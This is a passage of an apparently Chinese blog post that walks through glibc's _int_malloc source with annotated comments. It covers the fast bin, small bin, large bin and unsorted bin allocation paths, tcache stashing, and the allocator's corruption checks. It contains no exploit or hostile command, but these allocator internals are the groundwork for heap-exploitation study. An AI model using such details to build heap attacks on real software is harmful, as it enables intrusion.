class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="comment">//将申请的字节数bytes根据2*SIZE_SZ对齐转换成实际分配的字节数nb</span></span><br><span class="line">  <span class="comment">//并做了一些安全检查，确保不会溢出</span></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="comment">//如果当前的arena不可用，就用调用sysmalloc向操作系统直接申请nb大小的内存返回</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>fast bin存储在fastbinY数组中，一共有10个，每个fast bin都是一个单链表，只用fd将各个chunk串起来。每个单链表中的chunk大小是一样的，这样在找特定大小的chunk的时候就不用挨个找，只需要计算出对应链表的索引即可，提高了效率。如fastbinY[0]中存储的链表里都是16字节大小的chunk（以32位系统为例），之后每个链表增加8个字节，所以最后一个fast bin中存储的是88字节的chunk。另外，fast bin使用的是LIFO算法（即后入先出），这样刚被释放的chunk最先被分配，利用了局部性原理。</p><p>fast bin是除tcache外优先级最高的，如果fas tbin中有满足需求的chunk就不需要再到small bin和large bin中寻找。当在fast bin中找到需要的chunk后还将与该chunk大小相同的所有chunk放入tcache，目的就是利用局部性原理提高下一次内存分配的效率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp) \</span></span><br><span class="line"><span class="meta">  do                              \</span></span><br><span class="line"><span class="meta">  &#123;                               \</span></span><br><span class="line"><span class="meta">    victim = pp;                  \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (victim == NULL)           \</span></span><br><span class="line"><span class="meta">      break;                      \</span></span><br><span class="line"><span class="meta">  &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);</span></span><br><span class="line"><span class="comment">//判断实际分配的chunk大小是否满足fastbin的要求</span></span><br><span class="line"><span class="comment">//即小于等于MAX_FAST_SIZE(在32位中是80，在64位中是160)</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index(nb);<span class="comment">//寻找在fastbin数组中对应的索引</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);<span class="comment">//链表头指针</span></span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;<span class="comment">//将链表的第一个chunk作为victim取出，插入时也插入在链表头，即LIFO</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">        *fb = victim-&gt;fd;<span class="comment">//即将victim从链表中取出</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        REMOVE_FB(fb, pp, victim);<span class="comment">//也是将victim从链表中取出，fb指向下一个chunk</span></span><br><span class="line">      <span class="comment">//确保分配的chunk属于刚才找到的fastbin链表</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr(<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">//将大小为nb的chunk放到tcache里</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//mp_.tcache_bins=64</span></span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line"><span class="comment">//当对应tcache链没有满并且要放入tcache的chunk（即刚才被拿出去的chunk的下一个chunk）不为空</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count </span><br><span class="line">                 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//mp_.tcache_count=7,即tcache的链表最多7个chunk</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">//同上，从链表中取出tc_victim</span></span><br><span class="line">            <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">              *fb = tc_victim-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">              <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tcache_put(tc_victim, tc_idx);<span class="comment">//将取出的chunk放入对应的tcache链表</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">//返回从fastbin中找到的chunk</span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>small bin存储在bins数组中，下标为2到63，一共62个，和fast bin一样，每个small bin中的chunk都是相同的大小，下标为2的small bin中存储的是16个字节的chunk，之后一次增加8个字节，所以下标为63的small bin中存储的是504个字节的chunk（以32位系统为例）。与fast bin不同的是，small bin是一个双向循环链表，且采用FIFO（先进先出）算法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range(nb))<span class="comment">//即小于MIN_LARGE_SIZE(在32位下为512，在64位下为1024)</span></span><br><span class="line">                            <span class="comment">//所以small bin中最大的chunk为504字节和1008字节</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index(nb);<span class="comment">//算出对应的small bin索引</span></span><br><span class="line">    bin = bin_at(av, idx);<span class="comment">//找到对应的small bin链表</span></span><br><span class="line"><span class="comment">//如果small bin链表头的上一个chunk（即链表的最后一个chunk，small bin链表是双向循环链表）</span></span><br><span class="line"><span class="comment">//不等于它自己，即该small bin链表非空</span></span><br><span class="line"><span class="comment">//取链表的最后一个chunk作为victim，即FIFO</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">        malloc_consolidate(av);<span class="comment">//合并fastbin到unsortedbin</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;<span class="comment">//倒数第二个chunk</span></span><br><span class="line">        <span class="comment">//确保倒数第二个chunk的fd指向最后的chunk</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))</span><br><span class="line">          malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="comment">//将victim下一个chunk的PREV_INUSE位置1，即标记victim为被使用状态</span></span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">        <span class="comment">//将victim从链表中取出</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果不是main_arena将NON_MAIN_ARENA位置1</span></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena(victim);</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">//与fast bin中那部分相似，都是将所有大小为nb的chunk放入tcache中</span></span><br><span class="line">        <span class="comment">//不同的是在本部分中chunk放入tcache之前将该chunk标记为使用中</span></span><br><span class="line">        <span class="comment">//而fast bin的那部分没有</span></span><br><span class="line">        <span class="comment">//说明tcache和fast bin中的chunk尽管空闲还是都被标记为使用中</span></span><br><span class="line">        <span class="comment">//目的是防止相邻的chunk合并</span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;</span><br><span class="line">              set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena(tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              tcache_put(tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="large-bin1"><a href="#large-bin1" class="headerlink" title="large bin1"></a>large bin1</h3><p>这部分并不是真正地使用large bin，只是计算出了对应的large bin的索引，并调用<code>malloc_consolidate</code>函数合并fast bin，目的是减少堆中的碎片。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index(nb);<span class="comment">//算出对应的large bin的索引</span></span><br><span class="line">    <span class="comment">//合并 fast bin 到 unsorted bin</span></span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))</span><br><span class="line">      malloc_consolidate(av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted bin也存储在bins数组中，下标为1，所以只有一条unsorted bin链表。unsorted bin也是双向循环链表，但是链表里的chunk大小没有限制，任何大小的chunk都可以放到unsorted bin链表中，也没有顺序，采用的算法也是FIFO。</p><p>遍历unsorted bin的所有chunk，如果unsorted bin中只有一个chunk且为last_remainder时，就拆分last_remainder，并返回；否则如果当前chunk大小是所需的大小则先尝试放入tcache再返回，否则就将当前chunk放入对应的bin中，如果tcache已经有足够多的chunk则从tcache中返回chunk。当遍历完后，再判断是否有chunk被放入tcache，如果有则从tcache中返回chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//tcache变量定义及初始化</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx(nb);<span class="comment">//nb对应的tcache索引</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;<span class="comment">//用于标记是否有合适大小chunk在下面的过程中被放入tcache</span></span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;<span class="comment">//被处理过的unsorted chunk的数量</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;)<span class="comment">//大循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//unsorted bin非空</span></span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))</span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;<span class="comment">//倒数第二个chunk</span></span><br><span class="line">      <span class="comment">//victim的大小非法</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">      size = chunksize(victim);<span class="comment">//victim的大小</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp; <span class="comment">//如果请求的大小在small bin的范围内</span></span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp; <span class="comment">//并且unsorted bin中只有一个chunk</span></span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;<span class="comment">//并且该chunk就是last remainder</span></span><br><span class="line">          <span class="comment">//并且在该chunk中拿走nb的内存后依然可以成为一个chunk</span></span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;<span class="comment">//剩余部分的大小</span></span><br><span class="line">        remainder = chunk_at_offset(victim, nb);<span class="comment">//剩余部分的起始地址</span></span><br><span class="line">        <span class="comment">//将剩余部分取代原来的chunk放入unsorted bin链表中</span></span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        <span class="comment">//如果剩余部分过大则将fd_nextsize和bk_nextsize指针置空</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span 